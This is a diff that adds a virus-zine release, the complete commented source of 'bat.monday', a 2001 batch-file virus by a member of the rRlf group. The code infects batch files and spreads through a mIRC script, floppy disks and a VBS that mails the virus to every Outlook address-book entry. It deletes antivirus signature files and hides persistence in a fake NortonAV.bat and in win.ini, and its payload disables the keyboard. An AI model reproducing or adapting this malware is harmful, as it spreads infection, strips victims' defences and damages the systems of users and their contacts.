@@ -1,0 +1,223 @@
+"Pinoy Virus Writers" proudly presents:
+
+"bat.monday" by philet0ast3r [rRlf]
+************************************
+
+                  000000
+                 00000000  00     000000000
+                 00    00  00    00000000000
+                 00    00  00    00       00
+                 00   000  00    00       00
+       000000000000000000  00    00       00
+    0000000000000000000    00    00      00
+  00000          00        000000000000000
+ 0000          00000000    00000000000000
+  0000       00000000000         00
+    000      000 00   0000       00
+     000   000   00     0000     00
+      000 000    00       0000   00
+       0000      00         0000 00
+        00       00           00000
+        00       00              00
+
+             www.rRlf.de
+
+This is my 10th virus, and we have got end of February 2001 now.
+I know vortex from the scene. One day I read on his homepage,
+that he wants to release a zine. This virus was written for it,
+and will be released in/with it. Here are some facts:
+-parasitic bat-infector
+-searches the current, the parrent and the windows-system-directories
+-Outlook worm: uses Alco paul's method to create a vbs
+ that send's the batch-virus away
+ subject: Another ugly monday?
+ body: You don't like mondays? Here's the solution:
+ Read our few tips how to get over the next monday.
+-mIRC worm
+-spreads via disks
+-double-"residency": autostart & win.ini
+-retro: Norton AntiVirus 2000, AntiVir /9X Personal Edition,
+ F-Prot 95, McAfee, Thunderbyte
+-payload: disables the keyboard and displays the following message:
+ <begin message>
+ Do you hate m0ndays, too? No? Perhaps now you do.
+ ...
+ (if this is a monday;
+ did you know: phuckin ME doesn't take day-names as valid dates)
+ ...
+ bat.monday by philet0ast3r [rRlf]
+ <end message>
+ I wanted the virus to do this on every monday.
+ But then I had to realize, that Windows ME doesn't take day-names
+ as valid dates, so the payload gets not executed.
+ So I added a little thing: The payload gets now executed on
+ every date, that has a 1 in it's number
+ ... and on not ME systems: On every monday.
+-copies itself as call-back to the windows-directory
+-signature: m0n
+-fully compatible to Windows ME, Windows 98, Windows 95
+ (has been tested)
+-size: 4.114 bytes
+
+philet0ast3r likes to gr33t: 3ri5, dr.g0nZo [rRlf], El DudErin0 [rRlf],
+ppacket [rRlf], rastafarie [rRlf], luN4 [rRlf], vortex, Zoom23 [PVW],
+Alco paul, Necronomikon [ZG], cronus [DoJ], pissn3lk [AFN], BeLiAL [BC],
+ToxiC, herm1t, PetiK, Energy, BTK, kimera, h0axly, Virus 3000, Senna Spy,
+SnakeByte [MVX], Zarrmann, El Commandante, Julia, b3rnti, ina, janine,
+Ernst, fir3nz3 z00l, Mindjuice.
+
+Well, here is the script (with some comments "-->"; have to be
+removed for virus to run) ... phile-name should be fuck_mondays.doc.bat,
+but it's not neccessary:
+
+@echo off%_m0n%
+ctty nul.m0n
+if '%1=='m0n goto m0n%2
+set m0n=%0.bat
+if not exist %m0n% set m0n=%0
+if '%m0n%==' set m0n=autoexec.bat
+if exist %winbootdir%\bat.monday.bat goto m0nv
+if not exist %m0n% goto 5m0n
+find "m0n"<%m0n%>%winbootdir%\bat.monday.bat
+:m0nv
+command /e:5000 /c %winbootdir%\bat.monday.bat m0n inf
+
+-->the above is the first part of a quite normal infection-routine
+-->the hidden call-back-file is also created here
+
+:5m0n
+echo [script]>m0n23.bat
+echo n0=on 1:JOIN:#:{ >>m0n23.bat
+echo n1= /if ( nick == $me ) { halt } >>m0n23.bat
+echo n2= /.dcc send $nick c:\fuck_mondays.doc.bat >>m0n23.bat
+echo n3=} >>m0n23.bat
+if exist c:\mirc\mirc.ini copy m0n23.bat c:\mirc\script.ini
+if exist c:\mirc32\mirc.ini copy m0n23.bat c:\mirc32\script.ini
+if exist c:\progra~1\mirc\mirc.ini copy m0n23.bat c:\progra~1\mirc\script.ini
+if exist c:\progra~1\mirc32\mirc.ini copy m0n23.bat c:\progra~1\mirc32\script.ini
+if exist m0n23.bat copy fuck_mondays.doc.bat c:\fuck_mondays.doc.bat
+
+-->the above is the mIRC-worm-routine
+-->it makes a mIRC-script-file and places it in a possible mIRC-directory
+
+copy fuck_mondays.doc.bat c:\m0nday.sys
+if exist m0n23.bat del c:\programme\norton~1\s32integ.dll
+if exist m0n23.bat del c:\programme\f-prot95\fpwm32.dll
+if exist m0n23.bat del c:\programme\mcafee\scan.dat
+if exist m0n23.bat del c:\tbavw95\tbscan.sig
+if exist m0n23.bat del c:\programme\tbav\tbav.dat
+if exist m0n23.bat del c:\tbav\tbav.dat
+if exist m0n23.bat del c:\programme\avpersonal\antivir.vdf
+
+-->the above is the retro-routine
+-->the avs can not scan without those files
+
+if exist %winbootdir%\startmen\programme\autostart\NortonAV.bat goto rdm0n
+echo @echo off>m0n5.bat
+echo ctty nul>>m0n5.bat
+echo if exist c:\fuck_mondays.doc.bat goto 0k>>m0n5.bat
+echo copy c:\m0nday.sys c:\fuck_mondays.doc.bat>>m0n5.bat
+echo call c:\fuck_mondays.doc.bat>>m0n5.bat
+echo :0k>>m0n5.bat
+move m0n5.bat %winbootdir%\startmen\programme\autostart\NortonAV.bat
+
+-->the above is the autostart-residency-routine
+-->it checks if the virus has been deleted
+-->(and so if the win.ini-residency is still working)
+-->if yes, it solves the problem
+
+-->the below is the win.ini-residency-routine
+-->it infects the win.ini
+-->the empty lines are neccessary for windows taking this as true win.ini
+
+:rdm0n
+copy c:\fuck_mondays.doc.bat + %winbootdir%\win.ini %winbootdir%\system\win.ini
+del %winbootdir%\win.ini
+move %winbootdir%\system\win.ini %winbootdir%\win.ini
+goto dim0n
+
+[windows]
+load=c:\fuck_mondays.doc.bat
+run=C:\WINDOWS\SYSTEM\cmmpu.exe
+NullPort=None
+
+:dim0n
+if exist m0n23.bat command /f /c copy c:\fuck_mondays.doc.bat a:\
+
+-->the above is a command line, that makes it possible to copy to diskettes
+-->there will be no error if there is no disk in drive a:
+-->or if it is writeprotected or full
+
+:wym0n
+echo.on error resume next >%winbootdir%\m0n.vbs
+echo dim a,b,c,d,e >>%winbootdir%\m0n.vbs
+echo set a = Wscript.CreateObject("Wscript.Shell") >>%winbootdir%\m0n.vbs
+echo set b = CreateObject("Outlook.Application") >>%winbootdir%\m0n.vbs
+echo set c = b.GetNameSpace("MAPI") >>%winbootdir%\m0n.vbs
+echo for y = 1 To c.AddressLists.Count >>%winbootdir%\m0n.vbs
+echo set d = c.AddressLists(y) >>%winbootdir%\m0n.vbs
+echo x = 1 >>%winbootdir%\m0n.vbs
+echo set e = b.CreateItem(0) >>%winbootdir%\m0n.vbs
+echo for o = 1 To d.AddressEntries.Count >>%winbootdir%\m0n.vbs
+echo f = d.AddressEntries(x) >>%winbootdir%\m0n.vbs
+echo e.Recipients.Add f >>%winbootdir%\m0n.vbs
+echo x = x + 1 >>%winbootdir%\m0n.vbs
+echo next >>%winbootdir%\m0n.vbs
+echo e.Subject = "Another ugly monday?" >>%winbootdir%\m0n.vbs
+echo e.Body = "You don't like mondays? Here's the solution: Read our few tips how to get over the next monday." >>%winbootdir%\m0n.vbs
+echo e.Attachments.Add ("c:\fuck_mondays.doc.bat") >>%winbootdir%\m0n.vbs
+echo e.DeleteAfterSubmit = False >>%winbootdir%\m0n.vbs
+echo e.Send >>%winbootdir%\m0n.vbs
+echo f = "" >>%winbootdir%\m0n.vbs
+echo next >>%winbootdir%\m0n.vbs
+start %winbootdir%\m0n.vbs
+
+-->the above is the Outlook-worm-routine
+-->the created vbs sends the virus to the addresses in the address-book
+-->problem: when the vbs gets executed, and an (up to date) av-monitor is active,
+-->the system will probably halt, and the av will pop up a warning:
+-->"new vbs worm" or something like that
+
+:plm0n
+echo.|date|find "mon">m0n
+if errorlevel 1 goto 1m0n
+goto msgm0n
+:1m0n
+echo.|date|find "1">m0n
+if errorlevel 1 goto nom0n
+:msgm0n
+if exist m0n23.bat %winbootdir%\rundll32.exe keyboard,disable
+if exist m0n23.bat ctty con
+echo%_m0n% Do you hate m0ndays, too? No? Perhaps now you do.
+echo%_m0n% ...
+echo%_m0n% (if this is a monday;
+echo%_m0n% did you know: phuckin ME doesn't take day-names as valid dates)
+echo%_m0n% ...
+echo%_m0n% bat.monday by philet0ast3r [rRlf]
+ctty nul.m0n
+
+-->the above is the payload
+-->it checks if we got a monday (on not Windows ME systems) or a 1 in the date
+-->if yes, the keyboard gets disabled, and the message displayed
+
+:nom0n
+del m0n23.bat
+del m0n
+set m0n=
+goto endm0n
+:m0ninf
+for %%a in (*.bat ..\*.bat %winbootdir%\system\*.bat) do call %winbootdir%\bat.monday.bat m0n 23 %%a
+exit m0n
+:m0n23
+find "m0n"<%3>nul
+if not errorlevel 1 goto 17m0n
+type %winbootdir%\bat.monday.bat>m0n$
+type %3>>m0n$
+move m0n$ %3>nul
+exit m0n
+:17m0n
+set m0n!=%m0n!%1
+if %m0n!%==1 exit
+:endm0n
+
+-->the above is the rest of the infection-routine
